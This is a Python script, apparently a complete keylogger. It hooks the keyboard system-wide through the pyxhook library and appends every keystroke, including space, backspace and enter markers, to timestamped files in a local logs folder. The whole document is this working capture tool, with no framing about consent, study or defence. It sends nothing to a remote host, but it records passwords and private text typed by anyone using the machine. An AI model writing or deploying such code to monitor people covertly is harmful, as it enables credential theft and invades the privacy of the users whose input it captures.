import os
from datetime import datetime
import pyxhook

def main():
    # Specify the directory to store log files
    log_directory = "logs"
    if not os.path.exists(log_directory):
        os.makedirs(log_directory)

    # Create a log file with a timestamp
    log_file = f"{log_directory}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log"

    # The logging function with event parameter
    def on_keypress(event):
        with open(log_file, "a") as f:
            if event.Key == "space":
                f.write(" ")
            elif event.Key == "backspace":
                f.write("[BACKSPACE]")
            elif event.Key == "enter":
                f.write("[ENTER]\n")
            else:
                f.write(event.Key)

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = on_keypress

    # Set the hook
    new_hook.HookKeyboard()

    try:
        # Start the hook
        new_hook.start()
    except KeyboardInterrupt:
        # User cancelled from command line, so close the listener
        new_hook.cancel()
    except Exception as ex:
        # Write exceptions to the log file for analysis later
        msg = f"Error while catching events:\n{ex}"
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

if __name__ == "__main__":
    main()
